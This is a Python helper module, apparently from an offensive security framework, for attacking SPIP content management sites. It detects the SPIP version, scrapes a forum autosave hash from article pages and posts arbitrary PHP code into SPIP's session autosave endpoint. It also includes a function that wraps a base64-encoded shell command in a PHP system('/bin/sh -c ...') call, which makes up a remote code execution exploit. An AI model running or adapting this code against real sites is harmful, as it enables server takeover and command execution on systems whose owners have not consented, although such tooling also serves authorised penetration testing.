#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Generic SPIP HTTP helpers."""

from __future__ import annotations

import base64
import re
from typing import Optional
from urllib.parse import quote, urlencode

from core.framework.base_module import BaseModule

_VERSION_RE = re.compile(r"SPIP\s+(\d+(?:\.\d+)+)", re.I)
_AUTOSAVE_RE = re.compile(r'name="autosave"[^>]*value="forum_([a-f0-9]+)"', re.I)


class Spip(BaseModule):
    def _join(self, suffix: str) -> str:
        base = (getattr(self, "path", None) or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    def spip_version(self) -> str:
        for path in ("/spip.php", "/"):
            r = self.http_request(method="GET", path=self._join(path), allow_redirects=True)
            if not r:
                continue
            m = _VERSION_RE.search(r.text or "")
            if m:
                return m.group(1)
        return ""

    @staticmethod
    def spip_version_tuple(version: str) -> tuple[int, ...]:
        return tuple(int(x) for x in (version or "0").split(".") if x.isdigit())

    def article_path(self, article: str = "?article1") -> str:
        art = (article or "?article1").strip()
        if art.startswith("/"):
            return self._join(art)
        if art.startswith("?"):
            return f"{self._join('/spip.php')}{art}"
        return f"{self._join('/spip.php')}?{art}"

    def extract_autosave_hash(self, article: str = "?article1") -> Optional[str]:
        r = self.http_request(method="GET", path=self.article_path(article), allow_redirects=True)
        if not r:
            return None
        m = _AUTOSAVE_RE.search(r.text or "")
        return m.group(1) if m else None

    def inject_autosave(
        self,
        forum_hash: str,
        php_code: str,
        *,
        cookie: str = "",
    ):
        val = f"_hidden={quote(php_code, safe='')}"
        headers = {}
        if cookie:
            headers["Cookie"] = cookie
        return self.http_request(
            method="POST",
            path=self._join("/spip.php"),
            headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            data=urlencode(
                {
                    "action": "session",
                    "var": f"autosave_forum_{forum_hash}",
                    "val": val,
                }
            ),
        )

    @staticmethod
    def shell_php_fragment(command: str) -> str:
        b64 = base64.b64encode(command.encode()).decode()
        return f"@system('/bin/sh -c '.escapeshellarg(base64_decode('{b64}')));"